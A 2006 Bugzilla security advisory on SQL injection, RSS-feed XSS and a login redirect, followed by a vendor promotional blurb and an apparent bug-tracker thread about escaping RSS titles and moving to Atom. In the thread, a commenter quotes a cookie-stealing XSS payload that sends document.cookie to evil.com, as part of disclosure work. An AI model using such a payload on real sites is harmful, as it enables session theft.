# 2.18.4, 2.20, and 2.21.1 Security Advisory

Monday, Feb 20th, 2006
```

Summary
=======

Bugzilla is a Web-based bug-tracking system used by a large number of
software projects. The following security issues have been discovered
in Bugzilla:

* The 'whinedays' and 'mostfreqthreshold' parameters are not correctly
  validated in editparams.cgi. The first one can lead to SQL injection.

* Escaped HTML markup in titles of RSS feeds are incorrectly decoded by
  some RSS readers and could potentially lead to XSS vulnerabilities.

* The login form on the home page, in conjuction with very specific
  configuration settings and a specially formed URL, may redirect you
  outside the Bugzilla installation, allowing the login name and password
  to be stolen.

All affected installations are encouraged to upgrade as soon as
possible.

Vulnerability Details
=====================

Class:       SQL injection
Affected:    2.17.1 and above
Description: The 'whinedays' parameter, editable from editparams.cgi,
             is not validated before being saved. This can lead to SQL
             injection in the whineatnews.pl script. This injection
             requires administrative privileges.
             The validation for the 'mostfreqthreshold' parameter is also
             missing, but this is not exploitable.
References:  https://bugzilla.mozilla.org/show_bug.cgi?id=312498

Class:       Cross Site Scripting
Affected:    2.20rc1 - 2.20, 2.21.1
Description: Some RSS readers incorrectly decode escaped HTML markup in
             feed titles and this could be used to inject some scripts.
             Although this is not a Bugzilla bug, we prefer to shift to
             Atom feeds, where the RFC is unambiguous about HTML markup
             in feed titles.
References:  https://bugzilla.mozilla.org/show_bug.cgi?id=313441

Class:       Sensitive Data Exposure
Affected:    2.19.3 and above
Description: When the Bugzilla login page is at a subdirectory of the web
             server and the subdirectory name is a resolvable host on the
             victim's local network, it is possible to craft a URL that,
             when used to login to Bugzilla, would send the user's
             credentials to this host.
             These conditions make this flaw very difficult to exploit.
References:  https://bugzilla.mozilla.org/show_bug.cgi?id=325079

Vulnerability Solutions
=======================

The fix for these issues is included in the
releases. Upgrading to a release with the relevant fix will
protect your installation from possible exploits of these issues.

If you are unable to upgrade but would like to patch just the security
vulnerability, there are patches available for the issues at the
"References" URL.

Full release downloads, patches to upgrade Bugzilla from previous
versions, and git upgrade instructions are available at:

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

While it's formally correct and to-spec to have an RSS 1.0 <title> that includes &lt; when it isn't starting HTML markup, since the spec calls for plain text, practically speaking the title element has been so polluted with HTML that virtually all consumers treat it as HTML, and a literal < has to be double-escaped as &amp;lt; to not be treated as markup, and either filtered out or interpreted.
With <title>Wrong DOM-tree with &lt;form&gt; and &lt;button&gt; elements.</title>, my cautious RSS reader and Google Reader both display "Wrong DOM-tree with and elements.", but the very popular Bloglines reader treats them both as HTML, and displays an actual button with the text "elements." Switching to "FILTER html" instead of "FILTER xml" to get &amp;lt;form&amp;gt; would wind up displaying "&lt;form&gt;" in strict constructionist RSS readers, but anyone using them is surely used to that by now.

Bloglines must have broken their XSS filter: it's currently happy to display old favorites like |&lt;img src="..." onmouseover="this.src='<http://evil.com/get?'+document.cookie>">|, and since its whole interface is done in JavaScript... ouch. I don't \*think\* they've always been that insecure.
Me, I just want to be able to read the whole summary of bugs without missing chunks.

The fact that we call the desired state, &amp;lt; or &amp;amp;#161;, "double escaped" should have tipped me off that one FILTER wouldn't be enough. Static copy of sample output at <http://philringnalda.com/mtests/bugzilla/rss/escaped-title.xml> works fine in Bloglines and two other browser-based readers, and three desktop readers. Google Reader, though, is insane beyond belief, and double-decodes it and renders the HTML.
I should know better than to mention this sort of alternative when I want a patch reviewed, but: this ambiguity is one of the three reasons that Atom exists. <atom:title type="text">&lt;form&gt;</atom:title> has exactly one possible meaning, and no question whatsoever about who is wrong if it isn't displayed as "<form>".Assignee: query-and-buglist → bugzillaStatus: UNCONFIRMED → ASSIGNED

Meh. Google contacted. Bloglines contacted. NewsGator Online contacted.
If we're going to leave this security-sensitive until every browser-based RSS reader is free of XSS foolishness, we might want to clone an innocuous version to check in from. The first really wide-spread PoC I remember was the precursor to <http://diveintomark.org/archives/2003/06/12/how_to_consume_rss_safely> which was just a style="position:absolute;..." attribute. It's been very widely known in the RSS world that either you only allow through those elements and attributes you can trust, or you break and spew secrets, for more than two years, but it only took me half an hour to find XSS holes in the biggest three free online readers.

One filter ain't enough
My blessedly spotty memory made me forget the details of this impossible situation: RSS 1.0 clearly specifies that title is plain text, the author of RSS 2.0 says that because the spec says that description may contain entity-encoded HTML but it doesn't say that title may, the content model for RSS 2.0 title is plain text, so the feed validator warns on any feed which contains anything which might be escaped HTML, so the current RSS is absolutely unquestionably correct, and fails in virtually any client (and those like Firefox where it doesn't have bugs filed on them to make them fail).
If you need to use the character "<" in a feed title, which Bugzilla absolutely does, you have exactly three choices: be invalid and work, be valid and fail, or, the \*only\* real choice, use Atom instead.

If I understand correctly, what we actually do is correct. And even if some tags are interpreted in the bug summary, I really don't see how they could use this exploit to get sensitive information.
I'm suggesting WONTFIX.

The official RSS spec at <http://web.resource.org/rss/1.0/spec#s5.5.1>
says that the <title> element contains #PCDATA, it does not say that it contains plain text.
According to W3Schools (<http://www.w3schools.com/dtd/dtd_building.asp>):
----8<----
PCDATA means parsed character data.
Think of character data as the text found between the start tag and the end tag of an XML element.
PCDATA is text that will be parsed by a parser. Tags inside the text will be treated as markup and entities will be expanded.
----8<----
This means if we follow the spec to the letter, the contents of the title CAN contain <, >, and &, but they need to be escaped. ONCE. Any that are not escaped will be treated as tags and parsed.
This is what we do now for title. So Bugzilla is fine. If we follow the spec.
However, looking at the source of our RSS, we appear to be escaping the HTML in the <description> field, also, which is also declared to be #PCDATA.
<description>
&lt;table&gt;
&lt;tr&gt;
&lt;th&gt;Field&lt;/th&gt;&lt;th&gt;Value&lt;/th&gt;

&lt;/tr&gt;
&lt;/table&gt;
</description>
If I'm reading the spec correctly, this is over-escaped. Yet it looks fine in my RSS reader (NetNewsWire Lite).

What the RSS 1.0 spec says matters formally, but not practically, because by far the bulk of consumers just parse everything into uniform buckets and treat the contents as escaped soup even if they didn't come from RSS 2.0. See, e.g., <http://groups.yahoo.com/group/rss-dev/message/7255> and up the thread where RSS-DEV working group members say, roughly, "RSS 2.0 has polluted the content model, it's now escaped HTML."
If you want to be formally correct with content, while still passing HTML, you can use the <content:encoded> element for escaped HTML, but you still have the same problem with the required <description> that you have with <title>: it cannot contain HTML, but < passed correctly for plain text as &lt; will be interpreted as markup. Even Thunderbird, which survives the unescaped titles, interprets markup in description.
If you insist on not switching to Atom, and insist on not following the lead of virtually every consumer and the advice of the WG, there is one other option: replace every "<" in titles and plain text descriptions with a roughly similar looking character, say a &#x2039;. It looks awful in most fonts, but at least it's unambiguously not markup.

OK, basically there's no sane way to fix this while continuing to use RSS 1.0. If we intend to have HTML markup (or characters that could be used to create HTML markup) then we need to be using either RSS 2.0 or Atom.Flags: blocking2.22+

(In reply to [comment #11](/show_bug.cgi?id=313441#c11 "RESOLVED FIXED - [SECURITY] Query RSS should HTML-escape summary in <title>"))
> we need to be using either RSS 2.0 or Atom.
RSS 2.0 only solves the problem for <description>, and is even more ambiguous for instances of "&lt;" or "&amp;lt;" in <title>s, since the only points of reference for whether it's HTML or plain text are a weblog post by the spec author which explicitly says "this is not spec text" and each individual's interpretation of the meaning of the spec saying of <description> that it "may contain entity-encoded HTML" and saying nothing either way about <title>.
Even with Atom, there are still likely to be consumers which will misrender it; the difference is that for any misrendering, there is no doubt whatsoever whether it's Bugzilla's bug or the consumer's bug.

RSS 2.0 has numerous problems besides just the inconsistency Phil pointed out. RSS 1.0 is better, but work on it seems to have died out years ago, and it hasn't kept up with the times. Atom is both extant and sensible. We should switch to it.

Phil, are you going to implement Atom yourself? This bug is assigned to you and we plan to release 2.20.1 and 2.21.2 very soon now.Whiteboard: [doesn't affect 2.16, doesn't affect 2.18]

Gah, you're right, I did forget it was assigned to me. I'm working on it now, but anyone should feel free to steal it if I screw up again. Speaking of which: anyone who can, which doesn't seem to include me, should make it public: the last need for it to be security-sensitive, Bloglines' XSS holes, mostly got fixed after I published them, and then I screwed up and syndicated that post to planet.m.o, so the whole Moz community already knows about their vulnerability.
(BTW: W3C's feed validator is a branch, currently from mid-October though they're going to try to get closer to tip; <http://www.feedvalidator.org> is at most a few hours behind tip.)

[First cut work in progress](attachment.cgi?id=205023&action=diff) (obsolete)

— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=313441&attachment=205023)

Close as I think I can get with read-only access: I don't know how to fake a cvs remove of list.rss.tmpl.
The code to get the feed/updated date could use a more experienced eyeballing: it seems to work with my test data, but I haven't ever done much with Template Toolkit to know what's right and wrong.
Both sorts of <id>s make me nervous: the feed/id with lots of URL-encoding and XML-escaping is at risk of misinterpretation by buggy software, though there's really no alternative, and the entry/ids quite possibly should be specific to a particular feed, and not the id that an entry containing the whole content of the bug would use, but minting a feed-specific tag: URI isn't easy.
Then there's the choice of which sort of content escaping to use, which is the biggest reason I'm not really ready for actual review: even though Atom makes it perfectly clear who is at fault, there's at least one widely-used reader which will misinterpret any given type. For the otherwise-best choice, type="html", Firefox is one of the ones misinterpreting it, but with Firefox's only workable choice, type="text", we're back to [comment 0](/show_bug.cgi?id=313441#c0 "RESOLVED FIXED - [SECURITY] Query RSS should HTML-escape summary in <title>") - Bloglines (clearly incorrectly, in type="text" Atom) interprets what they should be escaping, though with a few less XSS holes than a month ago.

An abortive attempt at not breaking existing users, and installs that want to use RSS or both (client support for Atom isn't perfect and complete yet, and there are people with political preferences for one over the other).
Advice welcome: should I just intercept ctype=rss and force it to ctype=atom at some point?

I think that's the best behavior. Feed readers generally grep for feed type, so they should be able to handle the type changing out from under them, and if we're not going to have an RSS feed anymore we're better off directing users to the Atom feed than telling them "document not found".

Firefox WFM (at least, with type="text", it's bugged for type="html"): bookmarks manager, File, New Live Bookmark, add the sample URL and it works. How is it failing you?
The usual suspects for content, not just titles, are <http://sage.mozdev.org/> and <http://habarixenu.mozdev.org/> though <http://weblog.philringnalda.com/2005/12/05/telling-markup-from-text#comment-12005> says that both are buggy with type="text" titles.

Like so?
There's only one problem with this patch: the feed for a bug list with one bug contains no entry for that bug, just a description of the feed itself, as if the search had returned no results. The RSS version displays the single item correctly, so this is a regression.
Fix that, and I'll grant review.
Note that if the list contains no bugs, feedvalidator.org complains that the feed's author element is missing. But I think feedvalidator is in the wrong here, since the rule from the RFC is:
o atom:feed elements MUST contain one or more atom:author elements,
unless all of the atom:feed element's child atom:entry elements
contain at least one atom:author element.
Per this rule, it seems to me that if there are no entries, you don't have to add an author to the feed itself, since all of the entry elements do contain an author element, even if "all" here is zero.
feedvalidator.org also complains that "title should not contain HTML unless declared in the type attribute" for bugs whose titles reference entities (f.e. &#1503;). But the validator is assuming incorrectly that the title contains HTML, when in fact it does not (the titles are plain text, and any HTML-like constructs are meant to be displayed literally).

I'm astonished that it actually gave them all when n > 1 - I was foolishly popping off the latest bug to get the feed-level updated, I don't see why that doesn't take one off when there's more than one. If I understood Template Toolkit, I might say that was a bug in it.

Agreed, I'll fix it or file it. And since a Zarro Boogs feed can be useful, I'll file a bug on Bugzilla to move the "Feed" link out of the bugs.size > 0 section once this one's fixed.

This patch is now live on our QA installations, e.g. <http://landfill.bugzilla.org/qa220/> but neither Fx nor Tb can read the generated Atom feed, and it seems that FeedValidator doesn't accept that long uri.
Phil, could you do some tests at the URL above and let us know what's going on? I'm using Fx 1.5.0.1 and I could click the icon in the address bar and successfully add it to my bookmarks, but when opening this feed, I get the message: "Live Bookmark Feed failed to load".

Arrgh! Next problem: the very first feed I validated with real data (try validating searches from "Find a Specific Bug", they're shorter URLs) gives us a warning that "name should not be blank" from a reporter without a realname. What do we want to use in that case? Is the username from the email that's used for flags already available to me there? And do we already have a routine to strip empty parameters from query URLs that we could use on the feed URL? The validator's far from the only thing that enforces a needless 255 character limit on URLs.
